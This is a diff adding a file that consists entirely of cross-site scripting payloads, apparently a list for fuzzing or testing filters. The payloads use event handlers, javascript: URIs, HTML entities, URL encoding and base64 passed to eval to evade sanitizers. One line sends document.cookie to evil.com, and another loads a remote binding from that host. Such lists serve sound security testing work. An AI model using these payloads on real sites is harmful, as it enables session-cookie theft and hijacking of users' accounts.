@@ -1,0 +1,23 @@
+<img src=x onerror=alert(1)>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<svg/onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<body onload=fetch('//evil.com/'+document.cookie)>
+&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
+&#60;script&#62;alert(document.cookie)&#60;/script&#62;
+<a href="javascript&colon;alert(1)">click</a>
+<a href="javascript&#58;alert(1)">x</a>
+<iframe src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)>
+%253Cscript%253Ealert(1)%253C/script%253E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+%6f%6e%65%72%72%6f%72=alert(document.cookie)
+<button form=x formaction="javascript:alert(1)">go</button>
+<input type=image formaction=javascript:alert(1)>
+<div style="-moz-binding:url(http://evil.com/x.xml#x)">
+<svg><use xlink:href="data:image/svg+xml;base64,PHN2Zw=="></use></svg>
+<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>
+<video><source onerror=alert(1)></video>
+<keygen autofocus onfocus=alert(1)>
+\x3cimg src=x onerror=alert(1)\x3e
+<marquee onstart=alert(1)>scroll</marquee>
